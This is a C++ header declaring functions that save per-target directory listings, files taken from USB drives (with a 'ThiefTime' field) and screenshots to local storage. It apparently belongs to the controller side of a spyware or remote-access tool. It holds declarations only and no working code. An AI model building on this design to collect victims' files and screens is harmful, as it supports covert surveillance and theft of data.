//---------------------------------------------------------------------------

#ifndef LocalDataDirH
#define LocalDataDirH

#include <string>
//---------------------------------------------------------------------------

std::wstring GetDirDataFileName(std::wstring    widDirPath,
								std::string    dirPathBase64,
                              bool          &bExisted);

bool ExportDirDataToLocal(DWORD           dwTargetID,
                          const wchar_t *  lpwzfileName,
                          const char    *  lpsztimeStr,
                          const wchar_t *  lpwzdirPath,
                          const char    *  lpszdirData);

bool ExportUsbFileToLocal(DWORD          dwTargetID,
                          const wchar_t *lpwzFileName,
                          const wchar_t *lpwzRealPath,
                          const wchar_t *lpwzThiefTime,
                          const wchar_t *lpwzLwTime,
                          DWORD          dwFileSize);

bool ExportScreenFileToLocal(const char *lpszSrcFileName,
                             const wchar_t *lpwzSavePath,
                             wchar_t    *lpwzNodeName,
                             wchar_t    *lpwzFileName);

#endif
